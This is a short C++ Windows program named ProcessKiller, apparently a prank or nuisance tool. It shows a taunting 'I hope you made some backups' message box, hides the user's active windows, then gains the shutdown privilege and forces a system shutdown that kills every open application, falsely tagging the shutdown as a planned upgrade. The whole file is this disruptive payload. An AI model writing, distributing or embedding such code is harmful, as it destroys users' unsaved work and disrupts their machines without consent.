// ProcessKiller.cpp: определяет точку входа для консольного приложения.
//
#include "stdafx.h"
#include <Windows.h>
#include <thread>

bool Shutdown()
{
	HANDLE hToken;
	TOKEN_PRIVILEGES tkp;

	// Get a token for this process.
	if (!OpenProcessToken(GetCurrentProcess(),
		TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
		return false;

	// Get the LUID for the shutdown privilege.
	LookupPrivilegeValue(NULL, SE_SHUTDOWN_NAME, &tkp.Privileges[0].Luid);

	tkp.PrivilegeCount = 1;  // one privilege to set    
	tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	// Get the shutdown privilege for this process.
	AdjustTokenPrivileges(hToken, FALSE, &tkp, 0, (PTOKEN_PRIVILEGES)NULL, 0);

	if (GetLastError() != ERROR_SUCCESS)
		return false;

	// Shut down the system and force all applications to close.
	if (!ExitWindowsEx(EWX_SHUTDOWN | EWX_FORCE, SHTDN_REASON_MAJOR_OPERATINGSYSTEM | SHTDN_REASON_MINOR_UPGRADE | SHTDN_REASON_FLAG_PLANNED))
		return false;

	//shutdown was successful
	return true;
}

int main()
{
	int a = 5;
	auto KillerFunc = [&a]()
	{
		while (a)
		{
			Sleep(1000);
			HWND wnd = GetActiveWindow();
			if (!wnd) wnd = GetForegroundWindow();

			ShowWindow(wnd, SW_HIDE);
			a--;
		}
	};

	auto MessFunc = []()
	{
		MessageBox(0, L"I hope you made some backups.", L"CrazyWHDConcealer", MB_OK);
	};

	std::thread Mess(MessFunc);
	Sleep(100 * 30);

	std::thread KillThread(KillerFunc);
	Sleep(100 * 15);
	// Bye-bye...
	Shutdown();

    return 0;
}